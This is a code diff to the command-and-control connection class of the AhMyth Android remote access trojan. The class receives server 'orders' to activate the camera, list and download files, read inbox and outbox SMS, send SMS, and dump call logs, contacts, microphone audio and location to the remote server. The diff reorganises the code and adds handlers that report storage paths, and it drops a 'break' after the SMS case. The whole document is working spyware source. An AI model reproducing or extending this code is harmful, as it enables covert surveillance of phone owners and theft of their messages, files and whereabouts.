@@ -1,5 +1,6 @@
 package ahmyth.mine.king.ahmyth;
 
+import org.json.JSONException;
 import org.json.JSONObject;
 import io.socket.emitter.Emitter;
 
@@ -14,191 +15,143 @@ import java.lang.reflect.Method;
  * Created by AhMyth on 10/1/16.
  */
 
-
-
 public class ConnectionManager {
 
     public static Context context;
-
     private static io.socket.client.Socket ioSocket;
-
     private static FileManager fm = new FileManager();
 
     public static void startAsync(Context con)
-
     {
-
         try {
-
             ConnectionManager.context = con;
-
             sendReq();
-
         }catch (Exception ex){
-
             startAsync(con);
-
         }
-
     }
 
-
     public static void startContext() {
-
         try {
-
             findContext();
-
         } catch (Exception ignored) {
 
         }
-
     }
 
     private static void findContext() throws Exception {
-
         Class<?> activityThreadClass;
-
         try {
-
             activityThreadClass = Class.forName("android.app.ActivityThread");
-
         } catch (ClassNotFoundException e) {
-
             // No context
-
             return;
-
         }
 
         final Method currentApplication = activityThreadClass.getMethod("currentApplication");
-
         final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
 
         if (context == null) {
-
             // Post to the UI/Main thread and try and retrieve the Context
-
             final Handler handler = new Handler(Looper.getMainLooper());
-
             handler.post(new Runnable() {
-
                 public void run() {
-
                     try {
-
                         Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-
                         if (context != null) {
-
                             startAsync(context);
-
                         }
-
                     } catch (Exception ignored) {
 
                     }
-
                 }
-
             });
-
         } else {
-
             startAsync(context);
-
         }
-
     }
 
-
     public static void sendReq() {
-try {
+        try {
 
+            if(ioSocket != null )
+                return;
 
+            ioSocket = IOSocket.getInstance().getIoSocket();
 
-
-
-    if(ioSocket != null )
-        return;
-
-    ioSocket = IOSocket.getInstance().getIoSocket();
-
-
-    ioSocket.on("ping", new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            ioSocket.emit("pong");
-        }
-    });
-
-    ioSocket.on("order", new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject data = (JSONObject) args[0];
-                String order = data.getString("order");
-                Log.e("order",order);
-                switch (order){
-                    case "x0000ca":
-                        if(data.getString("extra").equals("camList"))
-                            x0000ca(-1);
-                        else if (data.getString("extra").equals("1"))
-                            x0000ca(1);
-                        else if (data.getString("extra").equals("0"))
-                            x0000ca(0);
-                        break;
-                    case "x0000fm":
-                        if (data.getString("extra").equals("ls"))
-                            x0000fm(0,data.getString("path"));
-                        else if (data.getString("extra").equals("dl"))
-                            x0000fm(1,data.getString("path"));
-                        break;
-                    case "x0000sm":
-                        if(data.getString("extra").equals("ls"))
-                            x0000sm(0,null,null);
-                        else if(data.getString("extra").equals("sendSMS"))
-                           x0000sm(1,data.getString("to") , data.getString("sms"));
-                        break;
-                    case "x0000cl":
-                        x0000cl();
-                        break;
-                    case "x0000cn":
-                        x0000cn();
-                        break;
-                    case "x0000mc":
-                            x0000mc(data.getInt("sec"));
-                        break;
-                    case "x0000lm":
-                        x0000lm();
-                        break;
-
-
+            ioSocket.on("ping", new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    ioSocket.emit("pong");
                 }
+            });
 
+            ioSocket.on("order", new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    try {
+                        JSONObject data = (JSONObject) args[0];
+                        String order = data.getString("order");
+                        Log.e("order",order);
+                        switch (order){
+                            case "x0000ca":
+                                if(data.getString("extra").equals("camList"))
+                                    x0000ca(-1);
+                                else if (data.getString("extra").equals("1"))
+                                    x0000ca(1);
+                                else if (data.getString("extra").equals("0"))
+                                    x0000ca(0);
+                                break;
+                            case "x0000fm":
+                                if (data.getString("extra").equals("ls"))
+                                    x0000fm(0, data.getString("path"));
+                                else if (data.getString("extra").equals("dl"))
+                                    x0000fm(1, data.getString("path"));
+                                break;
+                            case "getExternalStoragePath": // case for getting external storage path
+                                getExternalStoragePath();
+                                break;
+                            case "getSDCardPath": // case for SD card path
+                                getSDCardPath();
+                                break;
+                            case "x0000sm":
+                                if(data.getString("extra").equals("inbox")) {
+                                    x0000sm(0, "inbox", null);
+                                } else if(data.getString("extra").equals("outbox")) {
+                                    x0000sm(0, "outbox", null);
+                                } else if(data.getString("extra").equals("sendSMS")) {
+                                    x0000sm(1, data.getString("to"), data.getString("sms"));
+                                }
+                            case "x0000cl":
+                                x0000cl();
+                                break;
+                            case "x0000cn":
+                                x0000cn();
+                                break;
+                            case "x0000mc":
+                                x0000mc(data.getInt("sec"));
+                                break;
+                            case "x0000lm":
+                                x0000lm();
+                                break;
+                        }
+                    }catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+            });
+            ioSocket.connect();
 
-
-            }catch (Exception e) {
-                e.printStackTrace();
-            }
+        }catch (Exception ex){
+            Log.e("error" , ex.getMessage());
         }
-    });
-    ioSocket.connect();
-
-}catch (Exception ex){
-
-   Log.e("error" , ex.getMessage());
-
-}
-
     }
 
     public static void x0000ca(int req){
-
         if(req == -1) {
-           JSONObject cameraList = new CameraManager(context).findCameraList();
+            JSONObject cameraList = new CameraManager(context).findCameraList();
             if(cameraList != null)
-            ioSocket.emit("x0000ca" ,cameraList );
+                ioSocket.emit("x0000ca" ,cameraList );
         }
         else if (req == 1){
             new CameraManager(context).startUp(1);
@@ -206,22 +159,48 @@ try {
         else if (req == 0){
             new CameraManager(context).startUp(0);
         }
-
     }
 
-    public static void x0000fm(int req , String path){
-        if(req == 0)
-        ioSocket.emit("x0000fm",fm.walk(path));
+    public static void x0000fm(int req, String path) {
+        if (req == 0)
+            ioSocket.emit("x0000fm", fm.walk(path));
         else if (req == 1)
             fm.downloadFile(path);
     }
 
+    // part of the FileManager Class for dynamic path handling
+    public static void getExternalStoragePath() {
+        String path = fm.getExternalStoragePath();
+        JSONObject response = new JSONObject();
+        try {
+            response.put("path", path);
+            ioSocket.emit("getExternalStoragePath", response);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+    }
 
-    public static void x0000sm(int req,String phoneNo , String msg){
-        if(req == 0)
-            ioSocket.emit("x0000sm" , SMSManager.getSMSList());
-        else if(req == 1) {
-            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
+    // part of the FileManager Class for dynamic path handling
+    public static void getSDCardPath() {
+        String path = fm.getSDCardPath(context);
+        JSONObject response = new JSONObject();
+        try {
+            response.put("path", path);
+            ioSocket.emit("getSDCardPath", response);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void x0000sm(int req, String type, String msg) {
+        if (req == 0) {
+            if ("inbox".equals(type)) {
+                ioSocket.emit("x0000sm", SMSManager.getInboxSMSList());
+            } else if ("outbox".equals(type)) {
+                ioSocket.emit("x0000sm", SMSManager.getSentSMSList());
+            }
+        } else if (req == 1) {
+            boolean isSent = SMSManager.sendSMS(type, msg);
             ioSocket.emit("x0000sm", isSent);
         }
     }
@@ -254,12 +233,6 @@ try {
         }
         else
             location.put("enable" , false);
-
         ioSocket.emit("x0000lm", location);
     }
-
-
-
-
-
 }
